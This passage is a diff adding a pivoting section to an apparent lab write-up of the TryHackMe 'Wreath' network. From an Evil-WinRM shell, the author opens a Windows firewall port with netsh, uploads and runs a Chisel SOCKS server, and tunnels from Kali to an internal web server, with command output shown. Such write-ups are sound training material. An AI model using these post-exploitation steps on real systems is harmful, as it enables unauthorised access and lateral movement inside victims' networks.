@@ -2306,3 +2306,67 @@ finishTime    : 4/22/2021 10:49:34 AM
 ```
 
 </details>
+
+## 21. Personal PC - Pivoting
+
+<details>
+  <summary>---</summary>
+
+Two ports were found open. 
+- Port 80 - Web server 
+  - Potentially Wreath's website local environment
+- Port 3389 - RDP
+  - Require password or hash
+
+Options to access local webserver
+1. Chisel
+2. Plink
+
+Chisel forward proxy is a good option with sshuttle being used.
+
+1. Open up a port in Windows firewall (we chose port 34999 here) - `netsh advfirewall firewall add rule name="NAME" dir=in action=allow protocol=tcp localport=PORT`
+
+```
+*Evil-WinRM* PS C:\Users\Administrator\Documents> netsh advfirewall firewall add rule name="Chisel-Neozer0" dir=in action=allow protocol=tcp localport=34999
+Ok.
+```
+
+2. Start a `chisel client` on attacking machine
+
+```
+kali@kali:~/thm/wreath$ chisel client 10.200.85.150:34999 9090:socks
+2021/04/22 06:34:39 client: Connecting to ws://10.200.85.150:34999
+2021/04/22 06:34:39 client: tun: proxy#127.0.0.1:9090=>socks: Listening
+2021/04/22 06:35:24 client: Connection error: read tcp 10.50.86.79:40978->10.200.85.150:34999: i/o timeout
+2021/04/22 06:35:24 client: Retrying in 100ms...
+2021/04/22 06:36:09 client: Connection error: read tcp 10.50.86.79:40980->10.200.85.150:34999: i/o timeout (Attempt: 1)
+2021/04/22 06:36:09 client: Retrying in 200ms...
+2021/04/22 06:36:54 client: Connection error: read tcp 10.50.86.79:40982->10.200.85.150:34999: i/o timeout (Attempt: 2)
+2021/04/22 06:36:54 client: Retrying in 400ms...
+2021/04/22 06:37:28 client: Connected (Latency 262.542935ms)
+```
+
+3. Upload chisel (Windows version) to Git server and run `chisel server` (note we chose port 34999)
+
+```
+*Evil-WinRM* PS C:\Users\Administrator\Documents> upload /tmp/chisel c:\windows\tmp\chisel-Neozer0.exe
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> c:\windows\tmp\chisel-Neozer0.exe server -p 34999 --socks5
+chisel-Neozer0.exe : 2021/04/22 11:37:19 server: Fingerprint 4YNhTCGX+gcPiJEUdmRj7Qil1srdihA8ooqp0LBNLnY=
+    + CategoryInfo          : NotSpecified: (2021/04/22 11:3...hA8ooqp0LBNLnY=:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+2021/04/22 11:37:19 server: Listening on http://0.0.0.0:349992021/04/22 11:37:27 server: session#1: Client version (0.0.0-src) differs from server version (1.7.6)
+
+```
+
+4. Now port forwarding is connected, we set up Foxy proxy with the following settings
+- IP 127.0.0.1
+- Port 9090
+- Proxy type SOCKS5
+
+5. visit 10.200.85.100
+6. Use Wappalyzer to detect what technology is used on the page
+
+![local web server](wapplocalwebserver.png)
+
+</details>
